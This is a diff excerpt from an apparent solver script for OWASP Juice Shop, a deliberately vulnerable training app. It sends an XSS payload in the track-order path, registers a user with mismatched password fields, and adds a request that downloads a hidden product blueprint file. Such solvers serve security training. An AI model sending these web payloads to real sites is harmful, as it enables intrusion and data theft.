@@ -53,6 +53,8 @@ requests.put(url+'/api/Products/9', data={'description':'<a href="https://owasp.
 requests.get(url+'/rest/track-order/<iframe src="javascript:alert(`xss`)">')
 # ---- Repetitive Registration (Follow the DRY principle while registering a user.)
 requests.post(url+'/api/Users',data={'email':"aaaaaaa@juice-sh.op","password":"aaaaaaa","passwordRepeat":"aaaaaa","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2020-01-16T14:58:58.420Z","updatedAt":"2020-01-16T14:58:58.420Z"},"securityAnswer":"aaaaaaa"})
+# ---- Retrieve Blueprint (Deprive the shop of earnings by downloading the blueprint for one of its products.)
+requests.get(url+'/assets/public/images/products/JuiceShop.stl')
 # ---- Score Board (Find the carefully hidden 'Score Board' page.)
 requests.get(url+'/assets/public/images/padding/1px.png')
 # ---- Security Policy (Behave like any "white-hat" should before getting into the action.)
